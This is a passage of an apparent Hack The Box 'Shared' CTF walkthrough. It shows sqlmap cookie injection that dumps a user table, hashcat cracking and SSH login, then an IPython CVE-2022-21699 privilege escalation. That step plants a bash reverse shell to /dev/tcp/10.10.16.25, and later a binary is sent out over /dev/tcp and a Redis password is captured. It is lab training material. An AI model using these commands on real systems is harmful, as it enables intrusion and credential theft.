+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>22:40:20<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> fetched data logged to text files under <span style="color:#e6db74">&#39;/home/kali/.local/share/sqlmap/output/checkout.shared.htb&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> ending @ 22:40:20 /2022-11-11/
+</span></span></code></pre></div></li>
+<li>
+<p>To dump data from <em>user table</em>: <code>sqlmap -u 'http://checkout.shared.htb' --cookie='custom_cart={&quot;7DA8SKYP *&quot;:&quot;This is testing !!&quot;}' --level 5 --risk 3 --technique=B --batch --dbms=mysql -D checkout -T user --dump</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ sqlmap -u <span style="color:#e6db74">&#39;http://checkout.shared.htb&#39;</span> --cookie<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;custom_cart={&#34;7DA8SKYP *&#34;:&#34;This is testing !!&#34;}&#39;</span> --level <span style="color:#ae81ff">5</span> --risk <span style="color:#ae81ff">3</span> --technique<span style="color:#f92672">=</span>B --batch --dbms<span style="color:#f92672">=</span>mysql -D checkout -T user --dump 
+</span></span><span style="display:flex;"><span>        ___
+</span></span><span style="display:flex;"><span>      __H__
+</span></span><span style="display:flex;"><span>___ ___<span style="color:#f92672">[</span><span style="color:#e6db74">&#34;]_____ ___ ___  {1.6.9#stable}
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|_ -| . [&#39;]     | .&#39;| . |
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|___|_  [,]_|_|_|__,|  _|
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      |_|V...       |_|   https://sqlmap.org
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#39;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[*] starting @ 22:41:49 /2022-11-11/
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">custom injection marker (&#39;*&#39;) found in option &#39;--headers/--user-agent/--referer/--cookie&#39;. Do you want to process it? [Y/n/q] Y
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[22:41:49] [INFO] testing connection to the target URL
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">sqlmap resumed the following injection point(s) from stored session:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">---
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Parameter: Cookie #1* ((custom) HEADER)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    Type: boolean-based blind
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    Title: AND boolean-based blind - WHERE or HAVING clause
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    Payload: custom_cart={&#34;</span>7DA8SKYP <span style="color:#e6db74">&#39; AND 8525=8525-- fdrV&#34;:&#34;This is testing !!&#34;}
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">---
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[22:41:50] [INFO] testing MySQL
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[22:41:50] [INFO] confirming MySQL
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[22:41:50] [INFO] the back-end DBMS is MySQL
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">web application technology: Nginx 1.18.0
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">back-end DBMS: MySQL &gt;= 5.0.0 (MariaDB fork)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[22:41:50] [INFO] fetching columns for table &#39;</span>user<span style="color:#e6db74">&#39; in database &#39;</span>checkout<span style="color:#e6db74">&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[22:41:50] [WARNING] running in a single-thread mode. Please consider usage of option &#39;</span>--threads<span style="color:#e6db74">&#39; for faster data retrieval
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[22:41:50] [INFO] retrieved: 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">do you want to URL encode cookie values (implementation specific)? [Y/n] Y
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">3
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[22:41:51] [INFO] retrieved: id
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[22:41:54] [INFO] retrieved: username
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[22:42:14] [INFO] retrieved: password
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[22:42:30] [INFO] fetching entries for table &#39;</span>user<span style="color:#e6db74">&#39; in database &#39;</span>checkout<span style="color:#e6db74">&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[22:42:30] [INFO] fetching number of entries for table &#39;</span>user<span style="color:#e6db74">&#39; in database &#39;</span>checkout<span style="color:#e6db74">&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[22:42:30] [INFO] retrieved: 1
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[22:42:32] [INFO] retrieved: 1
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[22:42:36] [INFO] retrieved: fc895d4eddc2fc12f995e18c865cf273
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[22:43:52] [INFO] retrieved: james_mason
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[22:44:05] [INFO] recognized possible password hashes in column &#39;</span>password<span style="color:#e6db74">&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] N
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">do you want to crack them via a dictionary-based attack? [Y/n/q] Y
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[22:44:05] [INFO] using hash method &#39;</span>md5_generic_passwd<span style="color:#e6db74">&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">what dictionary do you want to use?
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[1] default dictionary file &#39;</span>/usr/share/sqlmap/data/txt/wordlist.tx_<span style="color:#e6db74">&#39; (press Enter)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[2] custom dictionary file
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[3] file with list of dictionary files
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&gt; 1
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[22:44:05] [INFO] using default dictionary
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">do you want to use common password suffixes? (slow!) [y/N] N
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[22:44:05] [INFO] starting dictionary-based cracking (md5_generic_passwd)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[22:44:05] [INFO] starting 4 processes 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[22:44:14] [WARNING] no clear password(s) found                                                                                                                                                                    
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Database: checkout
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Table: user
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[1 entry]
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">+----+----------------------------------+-------------+
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| id | password                         | username    |
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">+----+----------------------------------+-------------+
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| 1  | fc895d4eddc2fc12f995e18c865cf273 | james_mason |
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">+----+----------------------------------+-------------+
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[22:44:14] [INFO] table &#39;</span>checkout.<span style="color:#e6db74">`</span>user<span style="color:#e6db74">`</span><span style="color:#e6db74">&#39; dumped to CSV file &#39;</span>/home/kali/.local/share/sqlmap/output/checkout.shared.htb/dump/checkout/user.csv<span style="color:#e6db74">&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[22:44:14] [INFO] fetched data logged to text files under &#39;</span>/home/kali/.local/share/sqlmap/output/checkout.shared.htb<span style="color:#960050;background-color:#1e0010">&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> ending @ 22:44:14 /2022-11-11/
+</span></span></code></pre></div></li>
+</ul>
+<h2 id="cracking-credentials">Cracking Credentials</h2>
+<p>Found user <em>james_mason</em> with hash <em>fc895d4eddc2fc12f995e18c865cf273</em>. I&rsquo;ll try to crack this hash using <code>hashcat</code>:</p>
+<p><code>hashcat -a 0 -m 0 fc895d4eddc2fc12f995e18c865cf273 /usr/share/wordlists/rockyou.txt</code></p>
+<p>Got the password: <em>Soleil101</em></p>
+<h2 id="ssh-to-machine">SSH To Machine</h2>
+<p>If I try to <em>SSH</em> as <em>james_mason</em> and password <em>Soleil101</em>, it works:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ ssh james_mason@shared.htb 
+</span></span><span style="display:flex;"><span>james_mason@shared.htb<span style="color:#960050;background-color:#1e0010">&#39;</span>s password: 
+</span></span><span style="display:flex;"><span>Linux shared 5.10.0-16-amd64 <span style="color:#75715e">#1 SMP Debian 5.10.127-1 (2022-06-30) x86_64</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>The programs included with the Debian GNU/Linux system are free software;
+</span></span><span style="display:flex;"><span>the exact distribution terms <span style="color:#66d9ef">for</span> each program are described in the
+</span></span><span style="display:flex;"><span>individual files in /usr/share/doc/*/copyright.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+</span></span><span style="display:flex;"><span>permitted by applicable law.
+</span></span><span style="display:flex;"><span>Last login: Fri Nov <span style="color:#ae81ff">11</span> 12:29:09 <span style="color:#ae81ff">2022</span> from 10.10.14.44
+</span></span><span style="display:flex;"><span>james_mason@shared:~$ id
+</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>james_mason<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>james_mason<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>james_mason<span style="color:#f92672">)</span>,1001<span style="color:#f92672">(</span>developer<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>james_mason@shared:~$ 
+</span></span></code></pre></div><h3 id="post-enumeration">Post Enumeration</h3>
+<p>I&rsquo;ll use <code>pspy64</code> to monitor processes and see what is running:</p>
+<ul>
+<li>First I&rsquo;ll host the file using <code>python3 -m http.server</code>.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>james_mason@shared:/tmp$ wget http://10.10.16.25:8000/pspy64 <span style="color:#f92672">&amp;&amp;</span> chmod +x pspy64
+</span></span><span style="display:flex;"><span>--2022-11-12 07:58:10--  http://10.10.16.25:8000/pspy64
+</span></span><span style="display:flex;"><span>Connecting to 10.10.16.25:8000... connected.
+</span></span><span style="display:flex;"><span>HTTP request sent, awaiting response... <span style="color:#ae81ff">200</span> OK
+</span></span><span style="display:flex;"><span>Length: <span style="color:#ae81ff">3078592</span> <span style="color:#f92672">(</span>2.9M<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>application/octet-stream<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Saving to: ‘pspy64’
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>pspy64                                               100%<span style="color:#f92672">[======================================================================================================================</span>&gt;<span style="color:#f92672">]</span>   2.94M   575KB/s    in 6.4s    
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>2022-11-12 07:58:17 <span style="color:#f92672">(</span><span style="color:#ae81ff">466</span> KB/s<span style="color:#f92672">)</span> - ‘pspy64’ saved <span style="color:#f92672">[</span>3078592/3078592<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>james_mason@shared:/tmp$ ./pspy64 
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>2022/11/11 15:55:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">1001</span> PID<span style="color:#f92672">=</span><span style="color:#ae81ff">40710</span>  | /usr/bin/pkill ipython 
+</span></span><span style="display:flex;"><span>2022/11/11 15:55:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">1001</span> PID<span style="color:#f92672">=</span><span style="color:#ae81ff">40709</span>  | /bin/sh -c /usr/bin/pkill ipython; cd /opt/scripts_review/ <span style="color:#f92672">&amp;&amp;</span> /usr/local/bin/ipython 
+</span></span><span style="display:flex;"><span>2022/11/11 15:55:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">1001</span> PID<span style="color:#f92672">=</span><span style="color:#ae81ff">40711</span>  | /usr/bin/python3 /usr/local/bin/ipython 
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p>I can see another user of <em>UID=1001</em> running <em>ipython</em> in <em>/opt/scripts_review/</em>, and if I list this directory using <code>ls -la</code> I will see that it is owned by <em>developer</em> group which <em>james_mason</em> (my current user) is part of:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>james_mason@shared:~$ ls -la /opt/scripts_review/
+</span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">8</span>
+</span></span><span style="display:flex;"><span>drwxrwx--- <span style="color:#ae81ff">2</span> root developer <span style="color:#ae81ff">4096</span> Nov <span style="color:#ae81ff">12</span> 05:18 .
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">3</span> root root      <span style="color:#ae81ff">4096</span> Jul <span style="color:#ae81ff">14</span> 13:46 ..
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>james_mason@shared:~$ id
+</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>james_mason<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>james_mason<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>james_mason<span style="color:#f92672">)</span>,1001<span style="color:#f92672">(</span>developer<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>Now, if I check <em>ipython</em> version I can see that it is <em>8.0.0</em>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>james_mason@shared:~$ ipython --version
+</span></span><span style="display:flex;"><span>8.0.0
+</span></span></code></pre></div><h2 id="escalating-to-dan_smith-and-getting-user-flag">Escalating To dan_smith And Getting User Flag</h2>
+<p>And searching a little bit on google for possible exploits, I can see that it is vulnerable to <em>CVE-2022-21699</em> and the poc is in this github <a href="https://github.com/advisories/GHSA-pq7m-3gw7-gq5x"><em>repo</em></a>.</p>
+<p>In brief, I can abuse my privileges to write files to <em>/opt/scripts_review/</em> and gain code execution as any user that runs <em>ipython</em> in this directory, which in this case is the user of <em>UID=1001</em>:</p>
+<ul>
+<li>
+<p>On victim machine:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>james_mason@shared:/opt/scripts_review$ mkdir -m <span style="color:#ae81ff">777</span> /opt/scripts_review/profile_default
+</span></span><span style="display:flex;"><span>james_mason@shared:/opt/scripts_review$ mkdir -m <span style="color:#ae81ff">777</span> /opt/scripts_review/profile_default/startup
+</span></span><span style="display:flex;"><span>james_mason@shared:/opt/scripts_review$ echo <span style="color:#e6db74">&#39;import os;os.system(&#34;bash -c \&#34;bash -i &gt;&amp; /dev/tcp/10.10.16.25/4242 0&gt;&amp;1\&#34;&#34;)&#39;</span> &gt; /opt/scripts_review/profile_default/startup/foo.py
+</span></span></code></pre></div></li>
+<li>
+<p>On attacker machine:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ nc -lvnp <span style="color:#ae81ff">4242</span>
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">4242</span> ...
+</span></span><span style="display:flex;"><span>connect to <span style="color:#f92672">[</span>10.10.16.25<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.11.172<span style="color:#f92672">]</span> <span style="color:#ae81ff">37664</span>
+</span></span><span style="display:flex;"><span>bash: cannot set terminal process group <span style="color:#f92672">(</span>19154<span style="color:#f92672">)</span>: Inappropriate ioctl <span style="color:#66d9ef">for</span> device
+</span></span><span style="display:flex;"><span>bash: no job control in this shell
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>dan_smith@shared:/opt/scripts_review$ id
+</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>dan_smith<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1002<span style="color:#f92672">(</span>dan_smith<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1002<span style="color:#f92672">(</span>dan_smith<span style="color:#f92672">)</span>,1001<span style="color:#f92672">(</span>developer<span style="color:#f92672">)</span>,1003<span style="color:#f92672">(</span>sysadmin<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>dan_smith@shared:/opt/scripts_review$ 
+</span></span></code></pre></div></li>
+</ul>
+<p><img src="gettting_reverse_shell_as_dan_smith.png" alt="Gainnig Reverse Shell As dan_smith"></p>
+<h2 id="post-enumeration-as-dan_smith">Post Enumeration As dan_smith</h2>
+<p>Since <em>dan_smith</em> is part of <em>sysadmin</em> group, got from executing <code>id</code> command previously, I&rsquo;ll try to find files or directories owned by this group:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>dan_smith@shared:/tmp$ find / -group sysadmin 2&gt;/dev/null
+</span></span><span style="display:flex;"><span>/usr/local/bin/redis_connector_dev
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>dan_smith@shared:/tmp$ file /usr/local/bin/redis_connector_dev
+</span></span><span style="display:flex;"><span>/usr/local/bin/redis_connector_dev: ELF 64-bit LSB executable, x86-64, version <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>SYSV<span style="color:#f92672">)</span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, Go BuildID<span style="color:#f92672">=</span>sdGIDsCGb51jonJ_67fq/_JkvEmzwH9g6f0vQYeDG/iH1iXHhyzaDZJ056wX9s/7UVi3T2i2LVCU8nXlHgr, not stripped
+</span></span></code></pre></div><h3 id="finding-vulnerable-redis-server">Finding Vulnerable Redis Server</h3>
+<p>It appears that this group owns a custom executable file that seems responsible of connecting to a redis server. By executing this file, I got the following output:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>dan_smith@shared:/tmp$ /usr/local/bin/redis_connector_dev
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Logging to redis instance using password...
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>INFO command result:
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Server</span>
+</span></span><span style="display:flex;"><span>redis_version:6.0.15
+</span></span><span style="display:flex;"><span>redis_git_sha1:00000000
+</span></span><span style="display:flex;"><span>redis_git_dirty:0
+</span></span><span style="display:flex;"><span>redis_build_id:4610f4c3acf7fb25
+</span></span><span style="display:flex;"><span>redis_mode:standalone
+</span></span><span style="display:flex;"><span>os:Linux 5.10.0-16-amd64 x86_64
+</span></span><span style="display:flex;"><span>arch_bits:64
+</span></span><span style="display:flex;"><span>multiplexing_api:epoll
+</span></span><span style="display:flex;"><span>atomicvar_api:atomic-builtin
+</span></span><span style="display:flex;"><span>gcc_version:10.2.1
+</span></span><span style="display:flex;"><span>process_id:20820
+</span></span><span style="display:flex;"><span>run_id:b6b6f59e46c3d2cbeaeac87cc60da39cde942e82
+</span></span><span style="display:flex;"><span>tcp_port:6379
+</span></span><span style="display:flex;"><span>uptime_in_seconds:41
+</span></span><span style="display:flex;"><span>uptime_in_days:0
+</span></span><span style="display:flex;"><span>hz:10
+</span></span><span style="display:flex;"><span>configured_hz:10
+</span></span><span style="display:flex;"><span>lru_clock:7317624
+</span></span><span style="display:flex;"><span>executable:/usr/bin/redis-server
+</span></span><span style="display:flex;"><span>config_file:/etc/redis/redis.conf
+</span></span><span style="display:flex;"><span>io_threads_active:0
+</span></span><span style="display:flex;"><span> &lt;nil&gt;
+</span></span></code></pre></div><p>Looks like this executable contains a password that is sent to the redis server to authenticate, and the server&rsquo;s version is 6.0.15.</p>
+<p>And using <code>netsat</code> I can see port <em>6379</em> is open:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>dan_smith@shared:~$ netstat -lnpt
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>Not all processes could be identified, non-owned process info
+</span></span><span style="display:flex;"><span> will not be shown, you would have to be root to see it all.<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Active Internet connections <span style="color:#f92672">(</span>only servers<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+</span></span><span style="display:flex;"><span>tcp        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
+</span></span><span style="display:flex;"><span>tcp        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> 127.0.0.1:6379          0.0.0.0:*               LISTEN      -                   
+</span></span><span style="display:flex;"><span>tcp        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
+</span></span><span style="display:flex;"><span>tcp        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
+</span></span><span style="display:flex;"><span>tcp        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> 0.0.0.0:443             0.0.0.0:*               LISTEN      -                   
+</span></span><span style="display:flex;"><span>tcp6       <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> :::22                   :::*                    LISTEN      -                   
+</span></span></code></pre></div><p>Which means that the executable is connecting to <em>127.0.0.1</em> on port <em>6379</em> running redis version <em>6.0.15</em> by providing a password.</p>
+<p>Googling a little bit for exploits, I can see that this version is vulnerable to <a href="https://nvd.nist.gov/vuln/detail/CVE-2022-0543"><em>CVE-2022-0543</em></a>. And there is also a public <a href="https://github.com/vulhub/vulhub/blob/master/redis/CVE-2022-0543/README.md"><em>POC here</em></a>.</p>
+<h3 id="getting-password-for-redis-server">Getting Password For Redis Server</h3>
+<p>So, what I&rsquo;ll do first is to import this executable to my machine and listen on port 6379 using <code>nc</code>, then execute it to catch the password sent.</p>
+<ul>
+<li>On my attacking machine:
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ nc -lvnp <span style="color:#ae81ff">8989</span> &gt; redis_connect
+</span></span></code></pre></div></li>
+<li>On the victim machine:
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ cat /usr/local/bin/redis_connector_dev &gt; /dev/tcp/10.10.16.25/8989
+</span></span></code></pre></div></li>
+</ul>
+<p>Then I&rsquo;ll listen on port 6379 and execute the file:</p>
+<ul>
+<li>Shell 1:
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ nc -lvnp <span style="color:#ae81ff">6379</span>
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">6379</span> ...
+</span></span><span style="display:flex;"><span>connect to <span style="color:#f92672">[</span>127.0.0.1<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>127.0.0.1<span style="color:#f92672">]</span> <span style="color:#ae81ff">58990</span>
+</span></span><span style="display:flex;"><span>*2
+</span></span><span style="display:flex;"><span>$4
+</span></span><span style="display:flex;"><span>auth
+</span></span><span style="display:flex;"><span>$16
+</span></span><span style="display:flex;"><span>F2WHqJUz2WEz<span style="color:#f92672">=</span>Gqq
+</span></span></code></pre></div></li>
+<li>Shell 2:
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ chmod +x redis_connect 
+</span></span><span style="display:flex;"><span>$ ./redis_connect 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Logging to redis instance using password...
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>INFO command result:
+</span></span><span style="display:flex;"><span> i/o timeout
+</span></span></code></pre></div></li>
+</ul>
+<p>I got the password: <em>F2WHqJUz2WEz=Gqq</em>.</p>
+<h2 id="port-forwarding-redis-server">Port Forwarding Redis Server</h2>
+<p>Now, I&rsquo;ll forward it my attacking machine using <a href="https://github.com/jpillora/chisel"><em>chisel</em></a>, and exploit the server using the payload from the previous <a href="https://github.com/aodsec/CVE-2022-0543.git"><em>exploit poc</em></a> I found:</p>
+<ul>
+<li>First, I&rsquo;ll host the <a href="https://github.com/jpillora/chisel"><em>chisel</em></a> using <code>python3 -m http.server</code>.</li>
+<li>On my attacking machine:
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ /opt/chisel/chisel_1.7.7_linux_amd64 server -p <span style="color:#ae81ff">9001</span> --reverse
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>2022/11/12 15:53:52 server: Reverse tunnelling enabled
+</span></span><span style="display:flex;"><span>2022/11/12 15:53:52 server: Fingerprint /CogTSMbGXcwvy1M7DxTYDUtLfiXP4xQg1HEqiE7WCk<span style="color:#f92672">=</span>
+</span></span><span style="display:flex;"><span>2022/11/12 15:53:52 server: Listening on http://0.0.0.0:9001
+</span></span></code></pre></div></li>
+<li>On victim machine:
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>dan_smith@shared:/tmp$ wget http://10.10.16.25:8000/chisel_1.7.7_linux_amd64 <span style="color:#f92672">&amp;&amp;</span> chmod +x chisel_1.7.7_linux_amd64
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>dan_smith@shared:/tmp$ ./chisel_1.7.7_linux_amd64 client 10.10.16.25:9001 R:127.0.0.1:6379:127.0.0.1:6379 &amp;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>1<span style="color:#f92672">]</span> <span style="color:#ae81ff">20206</span>
+</span></span><span style="display:flex;"><span>2022/11/12 08:55:40 client: Connecting to ws://10.10.16.25:9001
+</span></span><span style="display:flex;"><span>2022/11/12 08:55:42 client: Connected <span style="color:#f92672">(</span>Latency 80.842105ms<span style="color:#f92672">)</span>
+</span></span></code></pre></div></li>
